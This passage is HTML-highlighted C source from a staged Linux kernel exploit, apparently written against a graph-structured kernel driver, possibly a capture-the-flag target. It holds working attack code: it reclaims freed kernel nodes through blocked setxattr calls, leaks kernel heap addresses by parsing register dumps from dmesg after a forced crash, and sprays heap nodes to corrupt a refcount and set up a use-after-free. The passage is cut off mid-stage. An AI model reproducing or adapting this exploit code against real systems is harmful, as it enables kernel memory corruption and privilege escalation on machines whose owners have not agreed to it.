</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>sem_wait</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>fault_arg</span><span class=p>.</span><span class=n>fault_sema</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>*</span><span class=n>node</span> <span class=o>=</span> <span class=n>mem</span> <span class=o>+</span> <span class=mh>0x1000</span> <span class=o>-</span> <span class=mh>0x7e</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=c1>// memcpy could cross boundaries
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x7e</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>node</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>ctx</span><span class=o>-&gt;</span><span class=n>setxattr_arg</span><span class=p>.</span><span class=n>buf</span> <span class=o>=</span> <span class=n>node</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>ctx</span><span class=o>-&gt;</span><span class=n>setxattr_arg</span><span class=p>.</span><span class=n>size</span> <span class=o>=</span> <span class=mh>0x7f</span><span class=p>;</span> <span class=c1>// avoid copy_from_user 16b optimization
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>assert</span><span class=p>(</span><span class=nf>pthread_create</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>setxattr_handle</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>setxattr_thread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>setxattr_arg</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>sem_wait</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>fault_arg</span><span class=p>.</span><span class=n>fault_sema</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>reclaim_alloc</span><span class=p>(</span><span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=o>*</span><span class=n>ctx</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>is_finalized</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>num_children</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>traversal_idx</span><span class=p>,</span>
</span></span><span class=line><span class=cl>						  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>traversal</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x80</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=c1>// refcount
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x30</span><span class=p>)</span> <span class=o>=</span> <span class=n>is_finalized</span><span class=p>;</span> <span class=c1>// is_finalized
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x58</span><span class=p>)</span> <span class=o>=</span> <span class=n>num_children</span><span class=p>;</span> <span class=c1>// num_children
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x70</span><span class=p>)</span> <span class=o>=</span> <span class=n>traversal_idx</span><span class=p>;</span> <span class=c1>// traversal_idx
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x78</span><span class=p>)</span> <span class=o>=</span> <span class=n>traversal</span><span class=p>;</span> <span class=c1>// traversal
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_alloc_raw</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>reclaim_free</span><span class=p>(</span><span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=o>*</span><span class=n>ctx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>sem_post</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>fault_arg</span><span class=p>.</span><span class=n>unblock_sema</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>pthread_join</span><span class=p>(</span><span class=n>ctx</span><span class=o>-&gt;</span><span class=n>setxattr_handle</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>stage1_leak_dmesg</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>dist_addrp</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>edges_addrp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>sz</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sz</span> <span class=o>=</span> <span class=nf>klogctl</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>sz</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>assert</span><span class=p>(</span><span class=nf>klogctl</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>sz</span><span class=p>)</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>dist_addr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>edges_addr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>sz</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=o>!</span><span class=n>dist_addr</span> <span class=o>||</span> <span class=o>!</span><span class=n>edges_addr</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>dist_addr</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=n>i</span><span class=p>,</span> <span class=s>&#34;RAX: &#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nf>sscanf</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>5</span><span class=p>,</span> <span class=s>&#34;%lx&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dist_addr</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=n>dist_addr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>edges_addr</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=n>i</span><span class=p>,</span> <span class=s>&#34;R09: &#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nf>sscanf</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>5</span><span class=p>,</span> <span class=s>&#34;%lx&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>edges_addr</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=n>edges_addr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>dist_addr</span> <span class=o>&amp;&amp;</span> <span class=n>edges_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>free</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>dist_addrp</span> <span class=o>=</span> <span class=n>dist_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=n>edges_addrp</span> <span class=o>=</span> <span class=n>edges_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// resulting size should be in a rarely used cache
</span></span></span><span class=line><span class=cl><span class=c1>// this is supposed to be arbitrary but if you change it you&#39;ll mess up stage 3
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define S1_DIST_NUM_NODES 12
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>stage1</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>dist_addrp</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>node_addrp</span><span class=p>,</span> <span class=kt>int</span> <span class=o>*</span><span class=n>node_fdp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S1] Creating graph</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>fds</span><span class=p>[</span><span class=n>S1_DIST_NUM_NODES</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>S1_DIST_NUM_NODES</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>fds</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nf>create</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>S1_DIST_NUM_NODES</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>llink</span><span class=p>(</span><span class=n>fds</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>fds</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S1] Freeing node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>release</span><span class=p>(</span><span class=n>fds</span><span class=p>[</span><span class=n>S1_DIST_NUM_NODES</span><span class=o>-</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>pid_t</span> <span class=n>pid</span> <span class=o>=</span> <span class=nf>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>pid</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S1] Reclaiming node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=n>ctx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nf>reclaim_alloc</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ctx</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x4141000000000000UL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S1] Finalizing root</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nf>finalize</span><span class=p>(</span><span class=n>fds</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S1] Performing crash query</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nf>query</span><span class=p>(</span><span class=n>fds</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>fds</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=c1>// Will never get here
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>usleep</span><span class=p>(</span><span class=mi>250</span> <span class=o>*</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S1] Leaking from dmesg</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>dist_addr</span><span class=p>,</span> <span class=n>edges_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>stage1_leak_dmesg</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dist_addr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>edges_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>node_addr</span> <span class=o>=</span> <span class=n>edges_addr</span> <span class=o>-</span> <span class=mh>0x60</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S1] Dist @ 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>dist_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S1] Node @ 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>node_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=n>dist_addrp</span> <span class=o>=</span> <span class=n>dist_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=n>node_addrp</span> <span class=o>=</span> <span class=n>node_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=n>node_fdp</span> <span class=o>=</span> <span class=n>fds</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=cp>#undef STAGE1_NUM_NODES
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>stage2_spray</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=n>fd</span><span class=p>,</span> <span class=kt>int</span> <span class=n>before</span><span class=p>,</span> <span class=kt>int</span> <span class=n>n</span><span class=p>,</span> <span class=kt>int</span> <span class=n>skip</span><span class=p>,</span> <span class=kt>int</span> <span class=n>after</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>before</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>create</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>n</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>fd</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nf>create</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>n</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=n>skip</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>release</span><span class=p>(</span><span class=n>fd</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=n>fd</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>after</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>create</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>stage2</span><span class=p>(</span><span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=o>*</span><span class=n>victim_ctx</span><span class=p>,</span> <span class=kt>int</span> <span class=o>*</span><span class=n>victim_fdp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=cp>#define STAGE2_NUM_NODES 16 </span><span class=c1>// dist array size == 0x80 == sizeof node
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Creating graph</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>fds</span><span class=p>[</span><span class=n>STAGE2_NUM_NODES</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>STAGE2_NUM_NODES</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>fds</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nf>create</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>STAGE2_NUM_NODES</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>llink</span><span class=p>(</span><span class=n>fds</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>fds</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=mi>1</span><span class=p>);</span> <span class=c1>// 1 will be written at traversal_idx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Freeing node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>release</span><span class=p>(</span><span class=n>fds</span><span class=p>[</span><span class=n>STAGE2_NUM_NODES</span><span class=o>-</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Reclaiming node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_alloc</span><span class=p>(</span><span class=n>victim_ctx</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=mh>0x80</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>/</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span> <span class=c1>// target: sprayed refcount
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Finalizing root</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>finalize</span><span class=p>(</span><span class=n>fds</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Creating predecessor</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>spray_incref_fd</span> <span class=o>=</span> <span class=nf>create</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define STAGE2_SPRAY_NUM 200
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Spraying nodes</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>spray_fd</span><span class=p>[</span><span class=n>STAGE2_SPRAY_NUM</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=nf>stage2_spray</span><span class=p>(</span><span class=n>spray_fd</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=n>STAGE2_SPRAY_NUM</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>30</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Incrementing sprayed refcounts</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>STAGE2_SPRAY_NUM</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>spray_fd</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=nf>llink</span><span class=p>(</span><span class=n>spray_incref_fd</span><span class=p>,</span> <span class=n>spray_fd</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nf>finalize</span><span class=p>(</span><span class=n>spray_incref_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Corrupting refcount</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>query</span><span class=p>(</span><span class=n>fds</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>fds</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Freeing victim node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>release</span><span class=p>(</span><span class=n>spray_incref_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
